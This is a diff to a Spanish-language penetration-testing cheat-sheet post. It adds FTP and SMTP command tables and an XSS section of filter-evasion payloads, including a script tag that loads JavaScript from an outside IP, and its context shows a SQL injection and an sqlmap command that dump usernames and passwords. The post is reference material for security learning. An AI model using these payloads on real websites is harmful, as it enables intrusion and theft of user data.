@@ -14,7 +14,7 @@ El siguiente Post es una recopilacion completa donde expongo una guia completa d
 
 **Nota:**  
 Debido al gran contenido que abarca la seguridad informatica, este post esta en constante actualizacion.  
-*- Ultima Actualizacion: 18 De Abril del 2019*
+*- Ultima Actualizacion: 18 De Junio del 2019*
 
 ## Tabla de contenido
 
@@ -31,6 +31,7 @@ Debido al gran contenido que abarca la seguridad informatica, este post esta en 
 **[Enumerando MySQL](#enumerando-mysql)**<br>
 **[Enumerando Oracle](#enumerando-oracle)**<br>
 **[SQL Injections](#sqlinjections)**<br>
+**[XSS Injections](#xssinjections)**<br>  
 **[Realizando transferencias de zonas DNS](#dns-zone-transfers)**<br>
 **[Montando Sistemas de archivos compartidos](#montando-recursos-compartidos)**<br>
 **[Tecnicas de Fingerprinting](#tecnicas-de-fingerprinting)**<br>
@@ -63,6 +64,19 @@ masscan 192.168.6.66 -p0-65535
 ```
 
 ## Enumerando FTP  
+
+| Comando FTP | Descripcion del Comando           |
+|-------------|-----------------------------------|
+| cd          | Cambiar del directo remoto        |
+| dir         | listar el contenido de un directorio |
+| get         | descargar un archivo              |
+| ls          | listar el contenido de un directorio |
+| mget        | descargar de multiples archivos   |
+| mkdir       | Crear un directorio en la maquina remota  |
+| mput        | Subir multiples archivos al servidor |
+| open        | Conectar al servidor FTP             |
+| put         | Subir un archivo                     |
+| quit        | Finalizar la sesion de FTP            |
 
 ```bash
 # Banner grab
@@ -142,6 +156,17 @@ QUIT
 ```  
 
 **Archivos de configuracion relacionados a SMTP**  
+
+| SMTP Command | Description of Command                                                                                                                                                                     |
+|--------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| HELO         | It’s the first SMTP command: is starts the conversation identifying the sender server and is generally followed by its domain name.                                                        |
+| EHLO         | An alternative command to start the conversation, underlying that the server is using the Extended SMTP protocol.                                                                          |
+| MAIL FROM    | With this SMTP command the operations begin: the sender states the source email address in the “From” field and actually starts the email transfer.                                        |
+| RCPT TO      | It identifies the recipient of the email; if there are more than one, the command is simply repeated address by address.                                                                   |
+| DATA         | With the DATA command the email content begins to be transferred; it’s generally followed by a 354 reply code given by the server, giving the permission to start the actual transmission. |
+| VRFY         | The server is asked to verify whether a particular email address or username actually exists.                                                                                              |
+| QUIT         | It terminates the SMTP conversation.                                                                                                                                                       |  
+
 sendmail.cf  
 submit.cf  
 
@@ -438,6 +463,25 @@ union select 1,(select group_concat(username,password) from sysadmin.users)
 ```  
 sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
 ```  
+
+## XSS Injections  
+
+Prueba de XSS básica sin filtro de evasión  
+<SCRIPT SRC=http://192.168.1.5/xss.js></SCRIPT>   
+
+Usando la etiqueta IMG con la directiva de JavaScript
+<IMG SRC="javascript:alert('Hacked By Gerh');">    
+  
+Evadiendo filtros anti XSS haciendo uso de minusculas y mayusculas    
+<IMG SRC=JaVaScRiPt:alert('XSS')>  
+
+Etiquetas IMG mal formadas  
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">  
+
+Haciendo uso del parametro **onerror**  
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>  
+
+Referencia importante:  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet  
 
 ## DNS Zone Transfers
 
